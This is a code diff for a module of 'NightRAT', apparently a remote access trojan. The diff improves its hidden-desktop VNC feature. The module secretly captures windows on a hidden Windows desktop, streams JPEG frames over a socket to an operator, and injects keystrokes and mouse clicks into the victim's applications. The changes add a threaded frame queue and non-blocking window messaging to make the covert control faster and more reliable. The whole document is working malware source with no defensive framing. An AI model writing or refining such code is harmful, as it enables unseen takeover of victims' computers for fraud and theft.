@@ -66,6 +66,20 @@ static wstring g_desktopName = L"NightRAT_HiddenDesktop";
 static mutex g_gdiplusMutex;
 static ULONG_PTR g_gdiplusToken = 0;
 
+// Frame Queue for Producer-Consumer
+struct FrameData {
+    HBITMAP hBmp;
+    int width;
+    int height;
+    int scale;
+    int fps;
+};
+static queue<FrameData> g_frameQueue;
+static mutex g_frameMutex;
+static condition_variable g_frameCV;
+static thread g_frameThread;
+static atomic_bool g_frameRunning(false);
+
 // Input Worker
 struct InputTask {
     string action;
@@ -218,22 +232,37 @@ static void ensure_desktop() {
     }
 }
 
-// Window compositing helper
-struct WindowInfo {
-    HWND hwnd;
-    RECT rect;
-};
+// -----------------------------------------------------------------------
+//  Frame Worker Thread (Consumer)
+// -----------------------------------------------------------------------
+static void frame_worker() {
+    while (g_frameRunning) {
+        FrameData data;
+        {
+            unique_lock<mutex> lock(g_frameMutex);
+            g_frameCV.wait(lock, [] { return !g_frameQueue.empty() || !g_frameRunning; });
+            if (!g_frameRunning && g_frameQueue.empty()) break;
+            data = g_frameQueue.front();
+            g_frameQueue.pop();
+        }
 
-static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
-    if (!IsWindowVisible(hwnd)) return TRUE;
-    vector<WindowInfo>* windows = (vector<WindowInfo>*)lParam;
-    RECT rect;
-    if (GetWindowRect(hwnd, &rect)) {
-        windows->push_back({hwnd, rect});
+        vector<unsigned char> jpeg;
+        if (bitmap_to_jpeg(data.hBmp, (ULONG)data.scale, jpeg)) {
+            safe_send_hvnc_frame(g_socket, data.scale, data.fps, data.width, data.height, jpeg);
+        }
+        DeleteObject(data.hBmp);
     }
-    return TRUE;
+    // Clean up queue
+    lock_guard<mutex> lock(g_frameMutex);
+    while(!g_frameQueue.empty()) {
+        DeleteObject(g_frameQueue.front().hBmp);
+        g_frameQueue.pop();
+    }
 }
 
+// -----------------------------------------------------------------------
+//  Capture Loop (Producer)
+// -----------------------------------------------------------------------
 static void capture_loop() {
     ensure_desktop();
     if (!g_hHiddenDesktop) {
@@ -246,87 +275,96 @@ static void capture_loop() {
         return;
     }
 
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
+    HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
+    HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
+
+    HDC hdcWin = CreateCompatibleDC(hdcScreen);
+    HDC hdcFinal = CreateCompatibleDC(hdcScreen);
+
     while (g_captureRunning) {
         DWORD start = GetTickCount();
         int scale, fps;
-        SOCKET s;
         {
             lock_guard<mutex> lock(g_captureMutex);
             scale = g_scalePercent;
             fps   = g_targetFps;
-            s     = g_socket;
         }
-
-        int sw = GetSystemMetrics(SM_CXSCREEN);
-        int sh = GetSystemMetrics(SM_CYSCREEN);
-
-        HDC hdcScreen = GetDC(NULL);
-        HDC hdcMem    = CreateCompatibleDC(hdcScreen);
-        HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
-        HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);
 
         // Fill background
         RECT fullRect = { 0, 0, sw, sh };
         FillRect(hdcMem, &fullRect, (HBRUSH)GetStockObject(BLACK_BRUSH));
 
-        vector<WindowInfo> windows;
-        EnumDesktopWindows(g_hHiddenDesktop, EnumWindowsProc, (LPARAM)&windows);
+        // Faster window enumeration
+        HWND hwnd = GetWindow(GetDesktopWindow(), GW_CHILD);
+        vector<HWND> windows;
+        while (hwnd) {
+            if (IsWindowVisible(hwnd)) windows.push_back(hwnd);
+            hwnd = GetWindow(hwnd, GW_HWNDNEXT);
+        }
         reverse(windows.begin(), windows.end());
 
-        // Optimize: Reuse DC for windows
-        HDC hdcWin = CreateCompatibleDC(hdcScreen);
-
-        for (const auto& win : windows) {
-            int ww = win.rect.right - win.rect.left;
-            int wh = win.rect.bottom - win.rect.top;
+        for (HWND h : windows) {
+            RECT rect;
+            if (!GetWindowRect(h, &rect)) continue;
+            int ww = rect.right - rect.left;
+            int wh = rect.bottom - rect.top;
             if (ww <= 0 || wh <= 0) continue;
 
             HBITMAP hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
             HGDIOBJ hOldWin = SelectObject(hdcWin, hbmpWin);
 
-            if (!PrintWindow(win.hwnd, hdcWin, PW_RENDERFULLCONTENT)) {
-                HDC hdcRealWin = GetWindowDC(win.hwnd);
+            if (!PrintWindow(h, hdcWin, PW_RENDERFULLCONTENT)) {
+                HDC hdcRealWin = GetWindowDC(h);
                 if (hdcRealWin) {
                     BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
-                    ReleaseDC(win.hwnd, hdcRealWin);
+                    ReleaseDC(h, hdcRealWin);
                 }
             }
-            BitBlt(hdcMem, win.rect.left, win.rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
+            BitBlt(hdcMem, rect.left, rect.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
 
             SelectObject(hdcWin, hOldWin);
             DeleteObject(hbmpWin);
         }
-        DeleteDC(hdcWin);
 
         int dw = (sw * scale) / 100;
         int dh = (sh * scale) / 100;
         if (dw < 1) dw = 1; if (dh < 1) dh = 1;
 
-        HDC hdcFinal = CreateCompatibleDC(hdcScreen);
         HBITMAP hbmpFinal = CreateCompatibleBitmap(hdcScreen, dw, dh);
         HGDIOBJ hOldFinal = SelectObject(hdcFinal, hbmpFinal);
         
-        SetStretchBltMode(hdcFinal, HALFTONE);
+        SetStretchBltMode(hdcFinal, COLORONCOLOR); // Faster than HALFTONE
         StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
 
-        vector<unsigned char> jpeg;
-        if (bitmap_to_jpeg(hbmpFinal, (ULONG)scale, jpeg)) {
-            safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg);
-        }
-
         SelectObject(hdcFinal, hOldFinal);
-        DeleteObject(hbmpFinal);
-        DeleteDC(hdcFinal);
 
-        SelectObject(hdcMem, hOldMem);
-        DeleteObject(hbmpMem);
-        DeleteDC(hdcMem);
-        ReleaseDC(NULL, hdcScreen);
+        // Send to consumer
+        {
+            lock_guard<mutex> lock(g_frameMutex);
+            if (g_frameQueue.size() < 2) { // Don't let queue grow too much
+                g_frameQueue.push({hbmpFinal, dw, dh, scale, fps});
+                g_frameCV.notify_one();
+            } else {
+                DeleteObject(hbmpFinal);
+            }
+        }
 
         DWORD elapsed  = GetTickCount() - start;
         DWORD interval = 1000 / (fps > 0 ? fps : 1);
         if (elapsed < interval) Sleep(interval - elapsed);
     }
+
+    SelectObject(hdcMem, hOldMem);
+    DeleteObject(hbmpMem);
+    DeleteDC(hdcMem);
+    DeleteDC(hdcWin);
+    DeleteDC(hdcFinal);
+    ReleaseDC(NULL, hdcScreen);
 }
 
 // -----------------------------------------------------------------------
@@ -342,26 +380,9 @@ static POINT screen_pt(int normX, int normY) {
 }
 
 // -----------------------------------------------------------------------
-//  Yardımcı: Bir noktadaki pencereyi bul (gizli desktop'ta)
-// -----------------------------------------------------------------------
-static HWND find_window_at(POINT screenPt) {
-    HWND hwnd = WindowFromPoint(screenPt);
-    if (!hwnd) return NULL;
-
-    HWND hChild = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
-    if (hChild && hChild != hwnd) {
-        HWND hDeeper = ChildWindowFromPointEx(hChild, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
-        if (hDeeper && hDeeper != hChild) hChild = hDeeper;
-        return hChild;
-    }
-    return hwnd;
-}
-
-// -----------------------------------------------------------------------
 //  Yardımcı: Odaklanmış pencereyi bul (gizli desktop'ta)
 // -----------------------------------------------------------------------
 static HWND GetFocusedWindow() {
-    // Favor manually tracked focus first as OS foreground state is sticky on hidden desktops
     HWND hTarget = g_hCurrentFocus;
     if (!hTarget) hTarget = GetForegroundWindow();
     if (!hTarget) hTarget = g_hLastWindow;
@@ -400,8 +421,8 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            if (!IsWindow(g_hCurrentFocus)) continue;
-            HWND hTarget = g_hCurrentFocus;
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
                 PostMessageW(hTarget, WM_KEYDOWN, vk, 0x00000001);
@@ -446,31 +467,30 @@ static void input_loop() {
                         case HTBOTTOMLEFT:   rc.left += dx; w -= dx; h += dy; break;
                         default: break;
                     }
-                    if (w < 50) w = 50;
-                    if (h < 20) h = 20;
+                    if (w < 100) w = 100;
+                    if (h < 50) h = 50;
                     SetWindowPos(g_dragHwnd, NULL, rc.left, rc.top, w, h,
                                  SWP_NOZORDER | SWP_NOACTIVATE);
                 }
-
-                // Efficient ghosting prevention
-                InvalidateRect(g_dragHwnd, NULL, TRUE);
-                InvalidateRect(GetDesktopWindow(), &g_dragStartRect, TRUE); // Clear old spot
 
                 PostMessageW(g_dragHwnd, WM_NCMOUSEMOVE, (WPARAM)g_dragHitTest,
                              MAKELPARAM(screenPt.x, screenPt.y));
             } else {
                 HWND hwnd = WindowFromPoint(screenPt);
                 if (hwnd) {
-                    LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0,
-                                              MAKELPARAM(screenPt.x, screenPt.y));
-                    if (ht == HTCLIENT) {
-                        POINT clientPt = screenPt;
-                        ScreenToClient(hwnd, &clientPt);
-                        PostMessageW(hwnd, WM_MOUSEMOVE, 0,
-                                     MAKELPARAM(clientPt.x, clientPt.y));
-                    } else {
-                        PostMessageW(hwnd, WM_NCMOUSEMOVE, (WPARAM)ht,
-                                     MAKELPARAM(screenPt.x, screenPt.y));
+                    LRESULT ht = HTCLIENT;
+                    if (SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                          SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht)) {
+                        if (ht == HTCLIENT) {
+                            POINT clientPt = screenPt;
+                            ScreenToClient(hwnd, &clientPt);
+                            PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(clientPt.x, clientPt.y));
+                        } else {
+                            PostMessageW(hwnd, WM_NCMOUSEMOVE, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
+                        }
+                        // Provide cursor feedback
+                        SendMessageTimeoutW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(ht, WM_MOUSEMOVE),
+                                          SMTO_ABORTIFHUNG, 200, NULL);
                     }
                 }
             }
@@ -485,10 +505,10 @@ static void input_loop() {
             HWND hRoot = GetAncestor(hwnd, GA_ROOT);
             g_hLastWindow = hRoot;
 
-            // Calculate hit-test before activation to avoid blocking the input thread later
-            LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y));
+            LRESULT ht = HTCLIENT;
+            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
-            // Async Activation to prevent "hanging" UI
             HWND hFore = GetForegroundWindow();
             if (hFore != hRoot) {
                 AllowSetForegroundWindow(ASFW_ANY);
@@ -500,13 +520,10 @@ static void input_loop() {
                 PostMessageW(hRoot, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hRoot);
             }
             PostMessageW(hwnd, WM_SETFOCUS, 0, 0);
-            
-            // Z-Order enforcement
             SetWindowPos(hRoot, HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
 
             if (ht != HTCLIENT) {
                 g_hCurrentFocus = hRoot;
-                // Title bar buttons (Close, Min, Max)
                 if (btn == 0) {
                     if (ht == HTCLOSE) {
                         PostMessageW(hRoot, WM_SYSCOMMAND, SC_CLOSE, 0);
@@ -539,12 +556,10 @@ static void input_loop() {
                 }
             } else {
                 HWND hTarget = hwnd;
-                HWND hChild  = ChildWindowFromPointEx(hwnd, screenPt,
-                                                      CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
+                HWND hChild  = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                 if (hChild && hChild != hwnd) hTarget = hChild;
 
                 g_hCurrentFocus = hTarget;
-
                 POINT clientPt = screenPt;
                 ScreenToClient(hTarget, &clientPt);
 
@@ -557,7 +572,6 @@ static void input_loop() {
 
         if (action == "hvnc_mouseup") {
             int  btn = cmd.value("button", 0);
-
             if (btn == 0 && g_dragging) {
                 g_dragging  = false;
                 g_dragHwnd  = NULL;
@@ -566,20 +580,16 @@ static void input_loop() {
             HWND hwnd = WindowFromPoint(screenPt);
             if (!hwnd) continue;
 
-            LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0,
-                                      MAKELPARAM(screenPt.x, screenPt.y));
+            LRESULT ht = HTCLIENT;
+            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
 
             if (ht != HTCLIENT) {
-                UINT ncMsg = WM_NCLBUTTONUP;
-                if (btn == 1) ncMsg = WM_NCRBUTTONUP;
-                else if (btn == 2) ncMsg = WM_NCMBUTTONUP;
-
-                PostMessageW(hwnd, ncMsg, (WPARAM)ht,
-                             MAKELPARAM(screenPt.x, screenPt.y));
+                UINT ncMsg = (btn == 1) ? WM_NCRBUTTONUP : (btn == 2 ? WM_NCMBUTTONUP : WM_NCLBUTTONUP);
+                PostMessageW(hwnd, ncMsg, (WPARAM)ht, MAKELPARAM(screenPt.x, screenPt.y));
             } else {
                 HWND hTarget = hwnd;
-                HWND hChild  = ChildWindowFromPointEx(hwnd, screenPt,
-                                                      CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
+                HWND hChild  = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
                 if (hChild && hChild != hwnd) hTarget = hChild;
 
                 POINT clientPt = screenPt;
@@ -601,7 +611,10 @@ static void input_loop() {
             SetFocus(hwnd);
             SendMessageW(hwnd, WM_ACTIVATE, WA_CLICKACTIVE, (LPARAM)hwnd);
 
-            LRESULT ht = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y));
+            LRESULT ht = HTCLIENT;
+            SendMessageTimeoutW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(screenPt.x, screenPt.y),
+                                SMTO_ABORTIFHUNG, 200, (PDWORD_PTR)&ht);
+
             if (ht == HTCLIENT) {
                 HWND hTarget = hwnd;
                 HWND hChild = ChildWindowFromPointEx(hwnd, screenPt, CWP_SKIPINVISIBLE | CWP_SKIPDISABLED);
@@ -640,6 +653,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
         if (action == "hvnc_start") {
             g_scalePercent = cmd.value("quality", 50);
+            if (!g_frameRunning.exchange(true)) {
+                if (g_frameThread.joinable()) g_frameThread.join();
+                g_frameThread = thread(frame_worker);
+            }
             if (!g_captureRunning.exchange(true)) {
                 if (g_captureThread.joinable()) g_captureThread.join();
                 g_captureThread = thread(capture_loop);
@@ -650,9 +667,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             }
         } else if (action == "hvnc_stop") {
             g_captureRunning = false;
+            g_frameRunning   = false;
             g_inputRunning   = false;
+            g_frameCV.notify_all();
             g_inputCV.notify_all();
             if (g_captureThread.joinable()) g_captureThread.join();
+            if (g_frameThread.joinable())   g_frameThread.join();
             if (g_inputThread.joinable())   g_inputThread.join();
             g_dragging = false;
             g_dragHwnd = NULL;
@@ -696,7 +716,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
     if (reason == DLL_PROCESS_DETACH) {
         g_captureRunning = false;
+        g_frameRunning   = false;
         g_inputRunning   = false;
+        g_frameCV.notify_all();
         g_inputCV.notify_all();
     }
     return TRUE;
